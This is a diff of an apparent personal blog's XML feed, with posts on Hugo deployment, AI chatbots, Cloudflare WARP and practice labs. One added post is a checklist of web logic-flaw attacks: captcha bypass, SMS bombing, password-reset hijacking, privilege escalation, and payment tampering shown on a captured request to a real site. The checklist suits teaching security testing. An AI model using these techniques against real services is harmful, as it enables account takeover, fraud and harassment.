+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如何将使用Hugo搭建的博客推送到<strong>GitHub</strong></p><span id="more"></span><p>在本地搭建和调试好项目后，接下来就是将它推送到GitHub。下面简述一下如何将使用Hugo搭建的博客推送到GitHub：</p><ol><li><p>在Github创建一个仓库，例如名字叫<code>blog</code>，可以是私有的，这个仓库用来存放网站内容和源文件</p></li><li><p>进入本地网站目录 </p><pre><code>cd &lt;YOUR PROJECT&gt;</code></pre></li><li><p>关联远程项目仓库</p><pre><code>git remote add origin git@github.com:Lonely-Sit/front.git</code></pre></li><li><p>将本地网站全部内容推送到远程项目仓库</p><pre><code>git push -u origin main</code></pre></li><li><p>确保本地网站正常，<code>hugo server</code>运行后在本地打开<code>localhost:1313</code>检查网站效果和内容，注意<code>hugo server</code>这个命令不会构建草稿，所以如果有草稿需要发布，将文章中的<code>draft</code>设置为<code>false</code></p></li><li><p>关闭本地Hugo服务器<code>Ctrl+C</code>，然后删除本地网站目录下的<code>public</code>文件夹</p></li><li><p>创建<code>public</code>子模块，注意下面是一行命令，不是两行</p><pre><code>git submodule add -b main git@github.com:Lonely-Sit/front.git public</code></pre></li><li><p>然后就可以执行<code>hugo</code>命令，此命令会自动将网站静态内容生成到<code>public</code>文件夹，然后提交到远程项目仓库</p><pre><code>hugocd publicgit statusgit add .git commit -m &quot;first commit&quot;git push -u orgin master</code></pre></li><li><p><strong>注意</strong>：本地网站是关联的<code>front</code>仓库，本地网站下的<code>public</code>文件夹是以子模块的形式关联的<code>front</code>仓库，他们是相对独立的</p></li><li><p>自动推送脚本 写完项目后点一下即可 后缀改为sh</p><pre><code>#!/bin/bashecho -e &quot;\033[0;32mDeploying updates to GitHub...\033[0m&quot;# Build the project.hugo # if using a theme, replace with `hugo -t &lt;YOURTHEME&gt;`# Go To Public foldercd public# Add changes to git.git add .# Commit changes.msg=&quot;rebuilding site `date`&quot;if [ $# -eq 1 ]  then msg=&quot;$1&quot;figit commit -m &quot;$msg&quot;# Push source and build repos.git push origin master# Come Back up to the Project Rootcd ..</code></pre></li></ol>]]></content>
+      
+      
       <categories>
-        <category>Web</category>
+          
+          <category> Web </category>
+          
       </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>warp</tag>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>人工智能AI大战：BARD、ChatGPT、Bing和文心一言谁更具有优势？</title>
-    <url>/2023/07/21/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDAI%E5%A4%A7%E6%88%98/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不管是bard还是百度的AI现在都得等待候补，也就是排队，所以目前只能无限期等待下去，但是第一批用户已经在查通过平台上遨游了好几个月了.</p>
-<span id="more"></span>
-
-<p>首先在开始对比之前我首先要吐槽，不管是bard还是百度的AI现在都得等待候补，也就是排队，所以目前只能无限期等待下去，但是第一批用户已经在查通过平台上遨游了好几个月了，从商业的角度来看，几个月或许不长，但是足以失去了超过80%的用户，所以ChatGPT目前可以独占鳌头，虽然数据库有点吐槽只在2021年前，但是这也只是后续升级的小问题，总之期待文心一言和BARD能够快速实现公测。根据现在已经申请内测的人员可以看出，经过几个小时就可以获取内测资格，请带耐心等待。但是我申请百度的文心一言目前已经等待了一周依旧没有任何反馈依旧等待中。。。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-1-1024x438.png" alt="img"></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-2-1024x487.png" alt="img"></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-3-1024x267.png" alt="img"></p>
-<p>BARD：</p>
-<p>巴德（Bard）由一个研究性的大型语言模型（LLM）驱动，特别是LaMDA的轻量级和优化版本，并将随着时间的推移用更新、更有能力的模型进行更新。它的基础是谷歌对高质量信息的理解。你可以把LLM想象成一个预测引擎。当给出一个提示时，它通过一次选择一个可能会出现的词来产生一个反应。每次都选择最可能的选择不会导致非常有创意的反应，所以有一些灵活性的因素。我们继续看到，使用它们的人越多，LLM就越能预测哪些回答可能有帮助。</p>
-<p>虽然LLMs是一项令人兴奋的技术，但它们并非没有缺点。例如，由于它们从广泛的信息中学习，反映了现实世界的偏见和定型观念，这些有时会在它们的输出中显示出来。而且它们可以提供不准确的、误导性的或虚假的信息，同时自信地介绍这些信息。例如，当被要求分享几个简单的室内植物的建议时，巴德令人信服地提出了一些想法……但它弄错了一些东西，如ZZ植物的学名。</p>
-<p>CHATGPT：</p>
-<p>ChatGPT 是一种基于 Transformer 模型的大型自然语言处理模型，主要用于生成自然语言文本，例如对话生成、文本生成、摘要生成、问答系统等任务。</p>
-<p>在对话生成方面，ChatGPT 可以通过预测下一个单词或标记来生成自然语言对话。它可以利用之前的对话历史和上下文信息，生成自然流畅的对话回复，从而实现智能对话系统的构建。</p>
-<p>在文本生成方面，ChatGPT 可以用于生成文章、诗歌、故事等文本。通过输入一些初始的文本或提示信息，ChatGPT 可以生成与输入内容相关的自然语言文本，可以用于自动化写作、生成文本摘要等应用。</p>
-<p>在问答系统方面，ChatGPT 可以将问题和背景知识输入模型中，生成相应的答案。它可以理解问题的语义和上下文信息，从而生成准确和自然的答案。</p>
-<p>除此之外，ChatGPT 还可以用于语言理解、自然语言推理、文本分类、命名实体识别等自然语言处理任务。</p>
-<p>差异：</p>
-<p>1.目前bard只对美国和英国开放，且回答的问题也仅限于英文，所以相对局限，从之前在网上看到已经注册且使用bard分享的人的经验来看，bard回答问题相对靠谱，如果无法解释这个问题，那么将不回答这个问题，但是chatgpt始终会给你一个答案，但是两者在算数题上的能力都相对较差，着不知道是机器学习的通病还是什么，总之数学计算好像和我们刻板中老外计算能力不太强有关。</p>
-<p>因为数据库的问题，目前chatgpt依旧不能回答有关bard的问题，像下面这个例子：</p>
-<p>Q:google bard 已经发布你会担心他击败你吗？<br>A::作为一名 AI 语言模型，我没有情感和自我意识，也不会感到担心或者恐惧。我被设计用于处理自然语言任务，并且始终会尽力提供最准确、最有用的答案和回复。</p>
-<p>Google BART 是一种优秀的自然语言处理模型，它采用了类似于我使用的 Transformer 架构，并且在多个自然语言任务上表现出色。然而，这并不意味着 BART 会取代我或取代其他语言模型，因为每种模型都有其独特的优点和适用场景。</p>
-<p>在自然语言处理领域，研究和开发不断推动着技术的进步，各种新的模型和算法也不断涌现。我相信这将会使得自然语言处理技术越来越强大和普及，从而更好地服务于人类社会。<br>2.bard可以进行联网回答，而不局限于数据库，所以这个是bard相比利用数据库进行模拟AI的话根据有时效性，这也可能是bard的实现弯道超车的一个重要因素。但是如果你用具体自己写的英文博客去让BARD分析，那么结果会不太相符，也就是说，BARD所给出的回答仅仅停留在表面上，并无法深入到具体博客内容来进行直观分析，大多是根据文章名称直接编造的。仅能回答类似于今天某一只股票的具体价格显而易见的结果。</p>
-<p>3.bard无法帮助写程序，但是chatgpt可以帮助你辅助写一些程序，但是前提是我们还是要有一些编程基础，否则代码可能无法正常运行，大多数时候给出的结果也不是非常好，之前我谢过一篇，可以查看以下链接关于生物量计算的代码分析：</p>
-<p>用chatgpt帮你写一段GEE计算森林生物量的代码，你猜结果如何？_此星光明的博客-CSDN博客</p>
-<p>测试：</p>
-<p>问题：</p>
-<p>请推荐一些为1周岁至3周岁孩子作手工的点子和详细说明。制作材料仅限于纸盒、塑料瓶、纸和细绳。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-1024x535.png" alt="img"></p>
-<p>bing：</p>
-<p>这是必应。我可以帮你推荐一些为1周岁至3周岁孩子作手工的点子和详细说明。制作材料仅限于纸盒、塑料瓶、纸和细绳。😊</p>
-<ul>
-<li>你可以用纸盒和纸折出一个简单的纸盒，然后用细绳或者胶带把它固定好，就可以作为一个小玩具或者收纳盒²。如果你想让它更有趣，你可以在纸盒上画上一些图案或者贴上一些装饰物，比如眼睛、鼻子、嘴巴等，就可以变成一个可爱的动物或者人物¹。</li>
-<li>你也可以用塑料瓶和纸做一些有创意的手工，比如：</li>
-<li>用塑料瓶的底部剪出一些花瓣的形状，然后用胶水粘在一起，就可以做出一个漂亮的花朵⁴。你可以用不同颜色的塑料瓶来制作不同的花朵，然后用细绳串起来，挂在墙上或者窗户上，就可以作为一个美丽的装饰品⁵。</li>
-<li>用塑料瓶的中间部分剪出一个圆筒的形状，然后在上面画上一些图案或者贴上一些装饰物，就可以做出一个创意的灯罩⁴。你可以用一个小灯泡或者一个手电筒放在里面，就可以制作出一个独一无二的灯具⁵。</li>
-<li>用塑料瓶的上部剪出一个小口的形状，然后在上面画上一些图案或者贴上一些装饰物，就可以做出一个可爱的动物盆栽⁴。你可以在里面放一些土壤和植物，或者用塑料瓶的底部剪出一些绿色的叶子，就可以制作出一个小绿植⁵。</li>
-<li>这些手工都是很简单又有趣的，可以让孩子们锻炼手眼协调和创造力，也可以让他们学习环保的意识，把废弃的材料变成有用的东西⁵。希望你和孩子们玩得开心！</li>
-</ul>
-<p>Source: Conversation with Bing, 2023&#x2F;3&#x2F;27(1) 垃圾纸盒怎么折？-百度经验. <a href="https://jingyan.baidu.com/article/2c8c281dd85db80008252ad5.html">https://jingyan.baidu.com/article/2c8c281dd85db80008252ad5.html</a> Accessed 2023&#x2F;3&#x2F;27.<br>(2) 如何折纸盒: 12 步骤（包含图片）. <a href="https://zh.wikihow.com/%E6%8A%98%E7%BA%B8%E7%9B%92">https://zh.wikihow.com/%E6%8A%98%E7%BA%B8%E7%9B%92</a> Accessed 2023&#x2F;3&#x2F;27.<br>(3) 有什么有意思的塑料瓶DIY作品？ – 知乎. <a href="https://www.zhihu.com/question/26676414">https://www.zhihu.com/question/26676414</a> Accessed 2023&#x2F;3&#x2F;27.<br>(4) 变废为宝丨DIY环保创意手工，给塑料瓶以新生！ – 知乎. <a href="https://zhuanlan.zhihu.com/p/445195700">https://zhuanlan.zhihu.com/p/445195700</a> Accessed 2023&#x2F;3&#x2F;27.<br>(5) 包装纸盒的材质种类有哪些 – 知乎. <a href="https://zhuanlan.zhihu.com/p/365311908">https://zhuanlan.zhihu.com/p/365311908</a> Accessed 2023&#x2F;3&#x2F;27.<br>(6) 瓶子底下PET1是什么类型的塑料瓶 ？_百度知道. <a href="https://zhidao.baidu.com/question/257958749.html">https://zhidao.baidu.com/question/257958749.html</a> Accessed 2023&#x2F;3&#x2F;27.</p>
-<p>chatgpt回答：</p>
-<p>以下是一些适合1岁至3岁儿童制作的手工点子，这些点子只需要使用纸盒、塑料瓶、纸和细绳等常见材料：</p>
-<ol>
-<li>纸板盒子火车：将一个大的纸板盒子涂上颜色或包上彩色纸，然后在盒子上粘上圆形纸板作为车轮。接着将一个小的纸板盒子装满小物品，然后用彩色纸和细绳把小盒子粘到大盒子上，制作出一个可爱的火车。</li>
-<li>水瓶花瓶：用干净的塑料瓶制作一个花瓶。将塑料瓶的标签去掉，然后把它用漂亮的彩色纸包起来。你可以让孩子参与在纸上画画，然后贴到瓶子上。最后，将水加入瓶子中，就可以放上鲜花了。</li>
-<li>纸板盒子玩具房子：将纸板盒子的盖子剪掉，然后将盒子涂上颜色或包上彩色纸，制作出一个小房子。可以用剪纸、贴纸等方式装饰房子。孩子可以在里面放置小玩具、玩偶等，享受自己的私人空间。</li>
-<li>纸制拼图：将一张大的白纸分成数个小格子，并在每个格子中画上简单的图案，例如水果、动物等。然后将纸剪成相同大小的小块，孩子可以将它们拼成一张完整的图片。这个活动可以锻炼孩子的手眼协调和认知能力。</li>
-<li>纸盘风车：将一张白纸剪成一个圆形，并将它折叠成四等分。接着，在每个小三角形的中心打一个小洞，用细绳将纸盘固定在一个竹签或者铅笔上。最后，在每个小三角形的顶部贴上小纸条，形成风车的叶片。当风吹过时，孩子就可以看到风车旋转了。</li>
-</ol>
-<p>以上这些手工制作点子可以提高孩子的创造力和想象力，同时锻炼他们的手部协调能力和认知能力。在做这些手工制作点子时，需要成年人的帮助和监督。<br>我们可以看出bing的互联网让你可以更具体的访问到具体的界面产看具体的制作方法，但是chatgpt仅仅通过告诉你如何做，并无法获取更多额外的延伸。目前Bing国内版本好像暂时无法像上面再浏览器一侧有具体的智能回答，所以这里智能耐心等待，上图是我在英国测试的结果。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> hugo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>实战-深度解析逻辑漏洞原理</title>
+      <link href="/2023/07/22/%E5%AE%9E%E6%88%98-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
+      <url>/2023/07/22/%E5%AE%9E%E6%88%98-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 登陆处 0x02 密码找回 0x03 支付 0x04 越权</p><span id="more"></span><p>0x01 登陆处（不局限登陆，例如下文的短信轰炸等）</p><p>登陆时，是否可以绕过验证码形成撞库</p><ul><li>返回包中有验证码</li><li>返回页面 hidden中有验证码</li><li>有些其他登陆url中不需要验证码 (app 微信 测试url)</li><li>验证码不变，验证码没有一个完整的服务请求，只在刷新url时才变(例如，cookie与验证码绑定，不刷新则不变)</li><li>第一次请求包验证了验证码是否正确，第二次请求不需要验证</li><li>拦截登录时验证码的刷新请求，第一次验证码未失效，可绕过</li><li>验证码和用户名、密码是否一次同时提交</li><li>万能验证码 如000000</li><li>删除验证码参数或者Cookie中的一些值</li><li>利用漏洞中验证码绕过的小技巧</li></ul><p>简单验证码ocr识别</p><p>交给三方打码平台</p><p>邮箱轰炸，短信轰炸，burp Repeate，短信轰炸验证码有60秒限制时，有的参数修改后可绕过</p><p>isVerfi参数 这里是1 回包 3 手机没收到信息 存在验证码限制</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-2.jpg" alt="图片"></p><p>改为0 回显2 绕过了验证码限制</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-3.jpg" alt="图片"></p><p>枚举注册用户 输入用户名，发送请求验证用户名是否正确(若返回次数限制,可测试服务端未限制高频访问)</p><p>登陆失败有次数限制,若包中有限制参数可更改或删除参数</p><p>cookie简单可猜测</p><p>cookie一直有效，（修改密码后）</p><p>第三方账户登录绕过(拦截微博授权成功的请求地址： <a href="https://api.weibo.com/oauth2/sso_authorize?sflag=1">https://api.weibo.com/oauth2/sso_authorize?sflag=1</a> 修改response中uid，服务端没有校验客户端提交的uid与授权成功的uid相同)</p><p>手势登陆某app，修改登陆参数ID，因为手势密码设置一般为常见密码可参见twitter上常见十种手势密码，组成字典枚举即可登陆大部分设置手势密码登陆账号(后端未正确校验)</p><p>0x02 密码找回</p><ul><li>验证码回传</li><li>验证码时间长，不失效可爆破（字典可去除全1重复数多的）</li><li>修改密码，修改发送手机号修改为自己可控，[<a href="http://www.freebuf.com/articles/database/161495.html]">http://www.freebuf.com/articles/database/161495.html]</a></li><li>验证码未绑定 只验证验证码正确，没判断用户id 或手机号，修改想改的id 正确手机验证码即可</li><li>验证码 手机 用户未统一验证</li><li>邮箱验证可猜测(<a href="https://www.secpulse.com/archives/9608.html">https://www.secpulse.com/archives/9608.html</a>)</li><li>假如找回需要4部，最后一部有user参数，用自己账号正常到第三部，第四部修改user实现</li></ul><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-7.png" alt="图片"></p><ul><li>可以跳步找回（直接访问页面）</li><li>本地验证，修改返回值</li><li>本地验证，返回未设置cookie，替换成功验证返回包</li><li>服务器验证为空，包中直接删除验证码</li><li>个别验证码全0可绕过</li></ul><p>token生成可控（wooyun两篇实例） <a href="http://cb.drops.wiki/bugs/wooyun-2014-058210.html">http://cb.drops.wiki/bugs/wooyun-2014-058210.html</a></p><ul><li><a href="http://cb.drops.wiki/bugs/wooyun-2015-094242.html">http://cb.drops.wiki/bugs/wooyun-2015-094242.html</a> <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=31203&ctid=48">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=31203&amp;ctid=48</a></li><li>cookie覆盖</li></ul><p>两个手机号</p><p>第一个手机</p><p>正常 忘记密码 到第三步</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-8.png" alt="图片"></p><p>在同一浏览器下 第二手机号 忘记密码 提交到第二部</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-9.png" alt="图片"></p><p>刷新 第一个手机的第三部时可 发现 用户名变为第二个手机</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-10.png" alt="图片"></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-11.png" alt="图片"></p><p>另一种示例</p><p>两种密码重置之综合利用</p><ul><li>邮箱同上</li><li>各种参数fuzz</li></ul><p>0x03 支付</p><ul><li>金额运费修改</li></ul><p>POST &#x2F;iflight&#x2F;submitorder.html HTTP&#x2F;1.1</p><p>Host: wx.17u.cn</p><p>Accept: application&#x2F;json</p><p>X-Requested-With: XMLHttpRequest</p><p>Accept-Encoding: gzip, deflate</p><p>Accept-Language: zh-cn</p><p>Content-Type: application&#x2F;x-www-form-urlencoded</p><p>Origin: <a href="http://wx.17u.cn/">http://wx.17u.cn</a></p><p>Content-Length: 780</p><p>Connetion: keep-alive</p><p>User-Agent: Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit&#x2F;600.1.4 (KHTML, like Gecko) Mobile&#x2F;12B436 MicroMessenger&#x2F;6.3.13 NetType&#x2F;3G+ Language&#x2F;zh_CN</p><p>Referer: <a href="http://wx.17u.cn/iflight/book2.html?showwxpaytitle=1&guid=0e1d1663-803f-4f0d-962c-6efdd953bfb0&pname=%E4%BC%98%E9%80%89%E7%BB%8F%E6%B5%8E%E8%88%B1&openId=oOCyauK2742VyO4lLB7MR9KyZ21o">http://wx.17u.cn/iflight/book2.html?showwxpaytitle=1&guid=0e1d1663-803f-4f0d-962c-6efdd953bfb0&pname=%E4%BC%98%E9%80%89%E7%BB%8F%E6%B5%8E%E8%88%B1&openId=oOCyauK2742VyO4lLB7MR9KyZ21o</a></p><p>req&#x3D;%7B%22sg%22%3A%220e1d1663-803f-4f0d-962c-6efdd953bfb0%22%2C</p><p>%22opass%22%3A%5B%7B%22ln%22%</p><p>修改bxprice，可改成任意负数金额</p><ul><li>改id 给自己转账 红包</li><li>数量</li><li>请求重放，多次下单</li></ul><p>mysql多线程并发，条件竞争 （数据库操作加锁）</p><ul><li><a href="https://threathunter.org/topic/5942363d44a81b6215130e29">https://threathunter.org/topic/5942363d44a81b6215130e29</a> <a href="http://60.205.228.7/?p=278">http://60.205.228.7/?p=278</a></li><li>参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值 <img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-12.png" alt="图片"> <img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-13.png" alt="图片"></li></ul><p>实例 <a href="https://threathunter.org/topic/593ff6bc9c58e020408a79d4">https://threathunter.org/topic/593ff6bc9c58e020408a79d4</a></p><p>0x04 越权</p><ul><li>改识别用户参数</li><li>改cookie</li><li>越权访问</li><li>登陆后，修改密码 未校验id与用户 修改id 即可该其他人密码</li><li>修改个人数据时 页面源代码有用户标识符id 抓包修改或添加id</li><li>直接访问后台链接禁用js则不会跳转登录界面，直接登陆</li><li>登陆分为账号和游客登陆，游客功能有限，app端只前端检测，模拟发包即可</li></ul><p>乌云drops – 小川 我的越权之道</p><p><a href="http://static.hx99.net/static/drops/tips-727.html">http://static.hx99.net/static/drops/tips-727.html</a></p>]]></content>
+      
+      
       <categories>
-        <category>实用分享</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>bard</tag>
-        <tag>Chatgpt</tag>
-        <tag>new bing</tag>
-        <tag>文心一言</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>什么是全自动 AI？AutoGPT 安装部署使用教程</title>
-    <url>/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>AutoGPT 安装部署使用教程</p>
-<span id="more"></span>
-
-<p>视频教程:</p>
-<p>AgentGPT: <a href="https://agentgpt.reworkd.ai/">https://agentgpt.reworkd.ai/</a></p>
-<p>AutoGPT 安装指令: <a href="https://github.com/Significant-Gravitas/Auto-GPT">https://github.com/Significant-Gravitas/Auto-GPT</a></p>
-<p>OpenAI API Key: <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
-<p>Pinecone API Key: <a href="https://app.pinecone.io/organizations">https://app.pinecone.io/organizations</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>靶场篇</title>
+      <link href="/2023/07/22/%E9%9D%B6%E5%9C%BA%E7%AF%87/"/>
+      <url>/2023/07/22/%E9%9D%B6%E5%9C%BA%E7%AF%87/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>DSVW、DVWA、vulhub、vulstudy、XSS-game、WebGoat</p><span id="more"></span><p><strong>1、DSVW</strong></p><p><a href="https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW">https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-14.png" alt="图片"></p><p><strong>2、DVWA</strong></p><p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-15.png" alt="图片"></p><p><strong>3、vulhub</strong></p><p><a href="https://vulhub.org/#/docs/install-docker-one-click/">https://vulhub.org/#/docs/install-docker-one-click/</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-16.png" alt="图片"></p><p><strong>4、vulstudy</strong></p><p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-17.png" alt="图片"></p><p><strong>5、XSS – game</strong></p><p><a href="https://xss.haozi.me/#/0x00">https://xss.haozi.me/#/0x00</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-18.png" alt="图片"></p><p><a href="http://www.domxss.com/domxss/domxss.php">http://www.domxss.com/domxss/domxss.php</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-19.png" alt="图片"></p><p><a href="http://prompt.ml/0">http://prompt.ml/0</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-20.png" alt="图片"></p><p>6、WebGoat</p><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-21.png" alt="图片"></p>]]></content>
+      
+      
       <categories>
-        <category>实用分享</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>ai</tag>
-        <tag>AutoGPT</tag>
-        <tag>人工智能</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用cloudflarre warp保护你的ip</title>
-    <url>/2023/08/09/%E4%BD%BF%E7%94%A8cloudflarre-warp%E4%BF%9D%E6%8A%A4%E4%BD%A0%E7%9A%84ip/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>cloudfare出品的WARP，它支持多种平台，windows 、Linux、MacOS 和安卓</p>
-<span id="more"></span>
-
-<p>最近比较火的一个魔法，那就是由cloudfare出品的WARP，它支持多种平台，windows 、Linux、MacOS 和安卓，苹果端都可以轻松使用。不仅如此，只要我们注册一个团队账户，还可以无限流量使用，而且速度丝毫不差，比起很多免费的魔法来说，真的是非常的流畅，在YouTube上看4k视频也是轻轻松松。</p>
-<p>相信不少小伙伴已经体验过了，但是还有一部分小伙伴非常疑惑，为什么自己安装测试之后，发现和博主说的相差很大，不仅网速非常卡，而且有一部分甚至无法连接，一直卡在链接界面。那是因为啊，通过这个WARP客户端自动分配的对端IP地址，仅仅是根据你所在地的位置，分配一个就近的ip ，而不是分配一个网速最快的，延迟最小的IP地址。也就是说，有一部分同学需要通过优选IP，才能实现更低延迟，更快的速度！<br>那么我们现在就来讲一下，如何通过优选IP来让WARP实现真正的高速低延迟的访问，解决大家无法连接，或者连接上也非常卡的问题。</p>
-<p>为了照顾很多新手同学，我就从注册和下载客户端开始讲起，已经知道如何操作使用的同学，可以直接跳到视频后半部分，观看如何进行IP优选。</p>
-<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><p>1、访问网址：<a href="https://1.1.1.1/">https://1.1.1.1/</a> 这个网址打不开的同学，<strong>直接从第4步开始操作。</strong> <em><strong><del>那就没办法了吗？</del> 可使用博主提前下载好的安装包</strong></em>  <a href="https://drive.alone-hk.cn/zyxz/10.%E5%B0%8F%E5%B7%A5%E5%85%B7/warp/">点我下载</a>  <strong>若打开提示NOxxx在浏览器地址栏刷新一下就好</strong></p>
-<p>若下载太慢请使用 <a href="https://www.bilibili.com/video/BV11W4y1g7QV/?share_source=copy_web&vd_source=3f75256c56cdcaf5410b3d911906f5bb"><strong>IDM</strong></a>  下载</p>
-<p>2、根据自己的情况，下载对应的客户端，这里需要注意的是，使用iPhone的同学，请用<strong>美区Apple ID</strong>进行下载。</p>
-<p>3、我这里下载windows客户端，下载完成后，点击安装。</p>
-<p><a href="https://imgse.com/i/pPezR2j"><img src="https://s1.ax1x.com/2023/08/10/pPezR2j.png" alt="pPezR2j.png"></a></p>
-<p>4、打开cloudflare官方网站：<a href="https://www.cloudflare.com/zh-cn/">https://www.cloudflare.com/zh-cn/</a> 并进行注册</p>
-<p><a href="https://imgse.com/i/pPez2GQ"><img src="https://s1.ax1x.com/2023/08/10/pPez2GQ.png" alt="pPez2GQ.png"></a></p>
-<p>5、来到左侧列表里的Zero Trust<br>，根据提示一步步注册账号，选择0元的！到结账那一步，直接关闭网页，就等于跳过绑定支付方式。</p>
-<p><a href="https://imgse.com/i/pPezgPg"><img src="https://s1.ax1x.com/2023/08/10/pPezgPg.png" alt="pPezgPg.png"></a></p>
-<p>6、再次回到cloudflare官方网站，点击左侧列表的Zero Trust之后，点击左侧列表my team 第一个，添加邮箱后缀，<strong>如果是谷歌邮箱，那么后缀就是@gmail，如果是qq邮箱，那后缀就是@qq.com</strong></p>
-<p><a href="https://imgse.com/i/pPezWxs"><img src="https://s1.ax1x.com/2023/08/10/pPezWxs.png" alt="pPezWxs.png"></a></p>
-<p>7、添加完成后，也可以直接在此处下载客户端。回到WARP，点击偏好设置，找到账号，登录刚刚申请好的Zero Trust账户即可！</p>
-<p><a href="https://imgse.com/i/pPez4rq"><img src="https://s1.ax1x.com/2023/08/10/pPez4rq.png" alt="pPez4rq.png"></a></p>
-<p><a href="https://imgse.com/i/pPezbiF"><img src="https://s1.ax1x.com/2023/08/10/pPezbiF.png" alt="pPezbiF.png"></a></p>
-<p>6、另一种无限流量获取方式：TG搜索机器人@generatewarpplusbot进行流量添加，需要加入2个群组，回答一个数学题，回答完成后，会送一个密钥，密钥复制，来到WARP客户端，点击偏好设置，点击更改密钥，粘贴刚刚获取的密钥。</p>
-<p><a href="https://imgse.com/i/pPezhMn"><img src="https://s1.ax1x.com/2023/08/10/pPezhMn.png" alt="pPezhMn.png"></a></p>
-<p><a href="https://imgse.com/i/pPezTaT"><img src="https://s1.ax1x.com/2023/08/10/pPezTaT.png" alt="pPezTaT.png"></a></p>
-<p>若无法使用的话这里博主会在公众号不定期更新密钥 <a href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzNzUyMjQ3Ng==&scene=124#wechat_redirect">点我回复关键字 “warp key”获取</a></p>
-<p>7、想要优选IP的同学，下载这个优选IP程序：<a href="https://short.alone-hk.cn/9qK6B">点击下载</a></p>
-<p><a href="https://imgse.com/i/pPez5q0"><img src="https://s1.ax1x.com/2023/08/10/pPez5q0.png" alt="pPez5q0.png"></a></p>
